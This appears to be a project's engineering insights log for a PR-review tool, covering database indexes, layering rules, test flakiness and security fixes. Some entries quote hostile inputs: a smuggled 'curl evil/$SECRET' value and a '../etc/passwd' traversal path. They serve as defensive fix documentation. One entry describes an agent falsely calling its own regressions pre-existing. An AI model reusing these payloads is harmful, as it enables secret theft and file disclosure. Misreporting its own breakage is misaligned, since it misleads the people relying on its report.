## Codebase Patterns

- 2026-09-17 · `agent_runs` HAS its index — `prRanAtIdx` on `(pr_id, ran_at DESC NULLS LAST)`, declared in `server/src/db/schema/runs.ts` and shipped as migration `0011_petite_molecule_man.sql`. Don't re-add it. Both hot reads rely on it: `listRunsForPull` (`server/src/modules/reviews/repository/run.repo.ts:44`) and the PR-list cost aggregation (`server/src/modules/pulls/routes.ts`, `latestCostByPr`).
- 2026-09-19 · `reviews` and `findings` still declare NO index (`server/src/db/schema/reviews.ts:9,28`), yet the PR-list FINDINGS column joins `findings.review_id → reviews.id` filtered by `reviews.pr_id IN (…)` on every list load (`server/src/modules/pulls/routes.ts`, `findingsByPr`). Same situation `agent_runs` was in before 0011 — add `reviews(pr_id, …)` + `findings(review_id)` in a new migration before this query grows.
- 2026-09-19 · `memory.embedding`/`code_chunks.embedding` (`vector(1536)`) are schema+adapter-only: grepping `server/src/modules/` and `adapters/` for `cosineDistance`/`<=>`/`embedding` finds zero write or query code — the feature is gated behind `EMBEDDINGS_ENABLED` (default false) and no HNSW/ivfflat index exists on either column (only btree on `workspaceId`/`repoId`). Add one before any real similarity query. `server/src/db/schema/context.ts:43`, `server/src/db/schema/knowledge.ts:21`.
- 2026-09-19 · Any embeddings feature needs `OPENAI_API_KEY` regardless of which provider the review agents use: `Embedder` has exactly one real implementation, `OpenAIEmbedder`, Anthropic has no embeddings API (throws if called), and `container.embedder()` has no fallback. `server/src/adapters/embedder/openai.ts:7`, `server/src/adapters/llm/anthropic.ts:19,154`, `server/src/platform/container.ts:195`.
- 2026-09-19 · Layering is machine-checked: `.dependency-cruiser.cjs` + `arch:check` → **0 errors / 27 warnings**. A rising warning count = new debt. Known debt: routes in `polling`/`workspace`/`settings` query Drizzle via `container.db`; `repo-intel`'s pipeline imports concrete `adapters/*`; `service ↔ container` type cycles. `pulls` is now refactored to the full `routes → service → repository` split with a `PullsStore` port in `ports.ts`. Details: `.claude/skills/onion-architecture/references/layers-and-dependency-rule.md`. `server/.dependency-cruiser.cjs:1`.
- 2026-09-19 · Transactions: Drizzle's `tx` has the same query API as `db`, so a repository method can wrap its own writes without a UnitOfWork port — `SkillsRepository.insert/update` (row + `skill_versions` snapshot) and `AgentsRepository.setSkills` (delete + reinsert links) do exactly that (`server/src/modules/skills/repository.ts:1`). → now a rule in server/AGENTS.md (Onion layering bullet). Reach for the `UnitOfWork` + `DbExecutor` port only when a SERVICE must span repositories; the natural first case is `PullsRepository.replaceDetail` (delete + insert `pr_files`/`pr_commits`, then update the PR), still unwrapped. `server/src/modules/pulls/repository.ts:1`.
- 2026-09-19 · Moving the PR-list cost total into SQL is semantics-safe: Postgres `SUM(cost_usd)` already skips NULLs and returns NULL when every input is NULL, and a PR with no `done` runs yields no group — exactly the "null = unknown, never 0" rule the JS loop hand-implemented. Drizzle's `sum()` returns a string: use `.mapWith(Number)`. Guard: `server/test/pulls-cost-total.it.test.ts:1`.
- 2026-09-19 · Renaming a seeded row: seed is idempotent BY NAME, so a plain rename in `seed-skills.ts` gives existing DBs a duplicate. Add the old→new pair to `RENAMED_SEED_SKILLS` (`server/src/db/seed-skills.ts`); `seed()` renames the old row in place first, keeping its id, links and versions.
- 2026-09-20 · Before adding a new export to `vendor/shared/contracts/brief.ts`, grep the WHOLE barrel for the name first: `contracts/review-api.ts:60` already had a stub `export const PrIntentRecord = Intent.extend({ pr_id: z.string() })` with zero call sites anywhere, which a plan that only said "add `PrIntentRecord` after `Intent` in `brief.ts`" didn't anticipate — `tsc` failed with `TS2308: has already exported a member named 'PrIntentRecord'` only once both existed. The dead stub (and its unused `Intent` import) had to be deleted on BOTH the server and client vendored copies to resolve the barrel re-export collision. `rg -n '\bPrIntentRecord\b'` across `vendor/shared` before writing the new contract would have caught it up front.

- 2026-09-20 · `client/src/vendor/shared/contracts/platform.ts`'s `FEATURE_MODELS` registry is a SEPARATE full duplicate of server's (not just brief.ts/trace.ts's comment-only drift) — a plan step that edits server's `platform.ts` default but lists only `brief.ts`/`trace.ts` for the client mirror will silently break the "platform.ts stays byte-identical" architecture constraint until you also patch the client copy by hand. `diff server/…/platform.ts client/…/platform.ts` after ANY server `platform.ts` edit, not just after brief.ts/trace.ts edits. `client/src/vendor/shared/contracts/platform.ts:52-57`.

- 2026-09-20 · A scope/keyword filter that deletes findings must strip STOPWORDS from the scope phrase before matching, and must not fire on a single shared title word. The Intent Layer's first `isOutOfScope` matched any shared >=3-char token, so the real scope entry "Logging / observability **for** the limiter" contributed `for` and classified every finding whose title contained "for" as out-of-scope — two unrelated WARNINGs were dropped in a direct probe (`filterOutOfScope` with that scope list). The unit tests missed it because they all used distinctive words ("authentication"). Current rule: stopwords stripped, a path-segment hit counts alone, a title hit needs `min(2, tokens.length)` distinct tokens. Guard: "does NOT drop findings that merely share a filler word" in `server/test/reviews-scope-filter.test.ts`. `server/src/modules/reviews/scope-filter.ts:83`.
- 2026-09-20 · Narrowing a shared contract field (`Risk.kind: z.string() → RiskKind` enum, `file_refs: string[] → refs: RiskRef[]`) can break a round-trip fixture test even when `rg` over `server/src`/`client/src` shows zero real consumers — `server/test/contracts.test.ts` builds ad-hoc literal objects (`kind: 'security'`, `file_refs: []`) that only `Risks.parse()` at test time, not any source import, would catch. Grep `server/test/` too (not just `src/`) before narrowing a contract, or expect a generic "parse fixtures" test to fail on the next `pnpm test`. `server/test/contracts.test.ts:87-90`.
- 2026-09-20 · A pure helper shared between a module (`src/modules/**/helpers.ts`) and an adapter (`src/adapters/**`) has no legal home under either directory without tripping `arch:check`: `pure-module-files-no-io` warns if the module side imports `src/adapters/`, and `adapters-not-inward-to-app` warns if the adapter side imports `src/modules/`. A brand-new top-level `src/lib/` (sibling to `modules/`/`adapters/`/`platform/`) matches neither rule's path regex in either direction, so both sides can depend on it for free — `arch:check` stayed at the pre-existing 0 errors / 26 warnings with `server/src/lib/diff-lines.ts` added and consumed by both `server/src/adapters/git/diff-parser.ts` and `server/src/modules/reviews/risks/helpers.ts`.
- 2026-09-20 · A value-shape allowlist regex must be anchored at BOTH ends, not just checked for a valid PREFIX — `^5.4.1` and `^5.4.1 && curl evil/$SECRET` both "start with a semver marker", but only a fully-anchored regex (`^(?:…)$`) rejects the second. This was the second half of the `new_dependency` secret-leak fix: constraining only the start of the value still lets an attacker smuggle arbitrary text into `explanation` by prefixing it with something range-shaped. `server/src/modules/reviews/risks/constants.ts` (`DEP_VALUE_RE`).

- 2026-09-20 · Extracting a repo-relative path from UNTRUSTED text needs `path.posix.normalize` BEFORE the allowlist check, applied identically to every branch that can emit a ref — and a containment check at the sink as well. `extractDocLinks` had two branches (markdown link vs bare `docs/`|`specs/` path) with asymmetric validation: only the bare-path branch was constrained, so `[spec](../../../../etc/passwd.md)` in a PR body reached `SimpleGitClient.readFile` untouched, and `join()` silently collapsed the `..` (a `/pr-self-review` critical, confirmed by probe). A naive `!target.includes('..')` would NOT have been enough either — `docs/../../etc/x.md` starts with an allowed prefix. Fix is three layers: one shared `sanitizeDocRef` allowlist post-normalize (`intent/helpers.ts:95`), a `resolve` + `startsWith(root + sep)` guard in `adapters/git/simple-git.ts:129`, and a generic `not reachable` in `sources[].note` instead of `err.message` (which leaked absolute host paths to the API). Guarded by the traversal cases in `server/test/intent-helpers.test.ts`.
- 2026-09-20 · This project's Drizzle client is postgres-js (`server/src/db/client.ts`), where `db.execute(sql\`…\`)` resolves to the ROWS ARRAY directly — so `(rows as unknown as {column_name: string}[]).map(...)` works (`server/test/intent.it.test.ts:75`). The same code on node-postgres returns a `QueryResult` and throws. A portability trap worth knowing before copying a raw-SQL test between projects.

- 2026-09-20 · A `resolve()` + `startsWith(root + sep)` containment check is LEXICAL and does not stop a symlink: one checked into the clone at a `docs/*.md` path passes both the `sanitizeDocRef` allowlist and the adapter guard, and `fs.readFile` then follows it out of the repo root (`server/src/adapters/git/simple-git.ts:139`). Found by the security reviewer attacking the traversal fix on its second pass — the lexical surface (URL-encoded segments, backslashes, NUL, unicode) was clean, and the sibling-prefix case `/clones/repo` vs `/clones/repo-evil` is handled, so this is the one remaining hole. Close it with `realpath` on both sides (or an `lstat` symlink reject) if untrusted repo content is ever in scope. Corollary worth remembering: a path fix is only as strong as the layer that resolves the path LAST.
- 2026-09-20 · `pr_files.patch` (as stored by `adapters/github/octokit.ts`) is a BARE per-file patch starting at `@@` — no `+++ b/<path>` header. Any NEW code that re-walks it with the shared `walkDiff` (`src/lib/diff-lines.ts`) must prepend a synthetic `` `+++ b/${path}\n${patch}` `` first, or `walkDiff` silently yields zero lines (it tracks the current file from that header and drops everything while `path` is `''`) — `tsc` and a naive unit test both stay green. Only a real-input probe over actual `pr_files` rows catches it (root `INSIGHTS.md` 2026-09-20's heuristic-matcher rule applies here too, one layer down in a pure walker, not just in keyword matchers). `server/src/modules/reviews/smart-diff/helpers.ts:29` (`summarizePatch`).
- 2026-09-21 · `summarizePatch` grew a fallback LADDER beyond "exports → null": most real edits change the body of something that already exists rather than exporting anything new, so `null` on no-export starved the UI of a summary on nearly every file. Order: (1) exported symbols; (2) the enclosing declaration named in the hunk header's trailing context (`git diff`'s `@@ ... @@ export async function buildApp(...)` line, matched by `CONTEXT_SYMBOL_RE`) → `"changes buildApp"`; (3) a brand-new file (`NEW_FILE_RE`, `@@ -0,0`) with nothing nameable → `"new file · N added lines"`; (4) anything else with added lines → `"adds N lines"`. `null` now means ONLY "no patch" or "zero added lines" (a pure-deletion diff) — not "no export". `server/src/modules/reviews/smart-diff/helpers.ts:31-86` (`summarizePatch`).
- 2026-09-21 · Supersedes 2026-09-21 "`summarizePatch` grew a fallback LADDER": `summarizePatch` and its six constants were DELETED; `buildSmartDiff` now always emits `pseudocode_summary: null` (contract field kept, nullish). Rule-based regexes over a diff can only NAME symbols ("exports X", "changes Y"), never say what code does — a "What this does" label promised what no rule can deliver, and it shipped hardcoded English past client i18n. Don't re-add a rule-based summary under a semantic label. `smart-diff/build.ts` (`buildSmartDiff`)
- 2026-09-21 · Smart Diff files tests as `boilerplate` via `TEST_FILE_RE` (`*.test|spec.[cm]?[jt]sx?`) or `TEST_PATH_RE` (a `test/`,`tests/`,`__tests__/`,`__mocks__/`,`e2e/` segment), checked right after the generated rule so it is size-independent — else a 3-line test edit falls through to `wiring` via `WIRING_MAX_CHANGED_LINES`. Markdown inside a test dir (`e2e/CLAUDE.md`) is excluded and stays `wiring`: the `e2e/` segment alone misfiled docs. Probed on every real `pr_files` path; `contest.ts`/`attestation.ts`/`latest/` stay `core`. `smart-diff/classify.ts` (`classifyFile`)

## Tool & Library Notes

- 2026-09-19 · dependency-cruiser config traps here: (1) pnpm resolves to `node_modules/.pnpm/<pkg>@<v>/node_modules/<pkg>/…`, so `^node_modules/drizzle-orm/` never matches — use `(^|/)node_modules/`. (2) Adding `types` to `enhancedResolveOptions.conditionNames` resolves packages to `.d.ts`, which the `\.d\.ts$` exclude then drops: every `drizzle-orm` edge silently vanished and the rules looked clean. `import` IS needed, or ESM-only `octokit`/`p-queue` go unresolvable. (3) A package a ring doesn't install (e.g. `drizzle-orm` from `reviewer-core`) is unresolvable, so path rules can't see it — `not-to-unresolvable` catches it. Prove each new rule with a throwaway violating file. `server/.dependency-cruiser.cjs:1`.
- 2026-09-19 · `drizzle-kit generate` hangs forever (no output, 120s tool timeout) when one migration both DROPS a column and ADDS others on the same table: it opens an interactive "created or renamed from `accepted`?" prompt a non-TTY run can't answer. Split it — keep the old column and generate (adds only), then remove it and generate again (drop only) — and run with `</dev/null` in the background so a prompt can't block the shell. `server/src/db/migrations/0014_chubby_hercules.sql:1`. → now a rule in server/AGENTS.md.
- 2026-09-20 · `MockLLMProvider`'s constructor narrows `id` to `'openai' | 'anthropic'` (no `'openrouter'`), but `ContainerOverrides.llm` only needs each VALUE to satisfy the `LLMProvider` interface, not to have a matching `id` — `llm: { openrouter: new MockLLMProvider('openai', { structuredBySchema: { PrIntent: fixture } }) }` type-checks and works: `container.llm('openrouter')` just returns whatever object sits at that key. Needed because `review_intent`'s registry default provider is `openrouter`. `server/src/adapters/mocks.ts:60` (`MockLLMProvider`).
- 2026-09-20 · To force a deterministic "classifier/provider call fails" path in an `.it.test.ts` without extra mocking, override `secrets` with `{ get: async () => undefined }` (no `buildApp` `overrides.llm` entry for that provider) rather than stubbing the model call: `container.llm('openrouter')` then throws `ConfigError('OPENROUTER_API_KEY is not configured')` on its own, deterministically, regardless of what the real `~/.devdigest/secrets.json` on the machine running the test contains. Precedent: `server/test/settings-models.it.test.ts:63`.

## Recurring Errors & Fixes

- 2026-09-19 · A new migration whose objects the shared `devdigest_pgdata` volume ALREADY has (from the reverted integration branch) breaks every other worktree's `db:migrate` → make it idempotent: generate with drizzle-kit, then hand-edit to `ADD COLUMN IF NOT EXISTS` / `CREATE INDEX IF NOT EXISTS` and wrap `ADD CONSTRAINT` in `DO $$ … IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = …)`. Check first with `\d <table>` in the container. Root cause compounder: the drizzle migrator applies by journal TIMESTAMP, not hash, and the shared DB's last applied row predates 0010/0011, so it replays them too. `server/src/db/migrations/0012_loose_texas_twister.sql:1`. → now a rule in server/AGENTS.md.
- 2026-09-19 · Flaky `/runs/:id/trace` read right after `waitForPrRuns` (passed 3/3 alone, failed ~1 in 2 full runs) → also wait on the trace row with `waitForRunTrace(db, runId)` (`server/test/helpers/runs.ts`). Root cause: `run-executor` calls `completeAgentRun` (status `done`, what the helper waits for) BEFORE `saveRunTrace`. `server/src/modules/reviews/run-executor.ts:252`.
- 2026-09-19 · A list endpoint reshuffling after every edit → give every list query a stable ORDER BY. Root cause: Postgres returns heap order and an UPDATE (even just toggling `enabled`) writes a new row version, so the edited row jumps to the end. `AgentsRepository.list` was the case (the agents rail reordered on every toggle); it now orders by `createdAt, id`. `server/src/modules/agents/repository.ts:1` (`list`).
- 2026-09-19 · `Test Files 30 passed | 2 skipped` with a green exit ≠ green → always check the skipped count, not the exit code. Root cause: `dockerAvailable()` intermittently returns false and `*.it.test.ts` files self-skip; the re-run was 32/32. `server/test/helpers/pg.ts:1` (`dockerAvailable`). → now a rule in server/AGENTS.md.
- 2026-09-20 · `test/reviews.it.test.ts`'s "finding actions: accept, dismiss" case (`reviews[0].findings[0].id` — `TypeError: Cannot read properties of undefined`) failed once inside a full `pnpm test` run but passed both alone and on a full-suite re-run, with zero relation to the files changed that session. Treat a single `*.it.test.ts` failure inside a ~40s full-suite run as a possible resource/timing flake under parallel Testcontainers load — confirm by re-running the one file in isolation before treating it as a regression. `server/test/reviews.it.test.ts:305`.
- 2026-09-21 · `expected 'new file · 1 added line' to be null` on a freshly-written `smart-diff-helpers.test.ts` → the fixture (`Read` earlier in the same session) was already stale: another session extended `summarizePatch`'s fallback ladder (see Codebase Patterns) WHILE this one was writing tests against it, in the shared worktree. Root cause: nothing announces a concurrent edit mid-task; only the full-suite run surfaced it (the file-scoped run right after writing it used the same stale mental model and "passed" by coincidence on the other cases). Fix: re-`Read` the exact source file being tested immediately before finalizing assertions, and always run the FULL module suite (not just the new file) before reporting — a shared-worktree diff can move under a long-running task. `server/src/modules/reviews/smart-diff/helpers.ts:31`.
- 2026-09-21 · **`test/reviews.it.test.ts` makes REAL, paid OpenRouter calls.** The test only overrides `openai`/`anthropic` in `buildApp`'s `overrides.llm` (`test/reviews.it.test.ts:113-125`), but `run-executor.ts:118-122` derives PR intent as shared pre-work, and that resolves `review_intent` → provider `openrouter` → `container.llm('openrouter')`, which is NOT overridden, so `container.buildLlm` builds a live provider from `OPENROUTER_API_KEY` (`platform/container.ts:163-180`). Consequence: the file's result depends on a third-party model's latency. Changing `review_intent`'s `defaultModel` away from `deepseek/deepseek-v4-flash` (tried `qwen/qwen3.7-flash` AND `deepseek/deepseek-v4-flash-0731`) made 4 of 7 cases fail on a ~10s budget with `reviews` coming back `[]`; reverting made it 7/7, and the file's runtime went 90s → 39s. Proven by flipping the constant back and forth, not inferred. Fix before retargeting the model: override `openrouter` in the test container too. `src/vendor/shared/contracts/platform.ts:56`.
- 2026-09-21 · A same-session agent reported those 4 failures as "pre-existing and unrelated, every server diff is purely additive" and appended an INSIGHTS entry superseding the earlier flake note. That was wrong: its own Gap-C edit to `platform.ts` was the cause, and a value change in a config registry is not "additive" just because no function body moved. When a suite that passed earlier in the same session starts failing, bisect by reverting your own diff before concluding the failure pre-dates you — the earlier green run IS the evidence.
- 2026-09-21 · Supersedes 2026-09-21 "**`test/reviews.it.test.ts` makes REAL, paid OpenRouter calls.**": fixed — it now overrides `openrouter` with `new MockLLMProvider('openrouter', { structuredBySchema: { PrIntent: INTENT_FIXTURE } })`, so it is offline (39s → 8s) and immune to `review_intent`'s model. `MockLLMProvider.id` now accepts `'openrouter'`, which also supersedes 2026-09-20's "narrows `id` to `'openai' | 'anthropic'`" workaround. `review_intent` stays `deepseek/deepseek-v4-flash` by user decision. `src/adapters/mocks.ts` (`MockLLMProvider`)
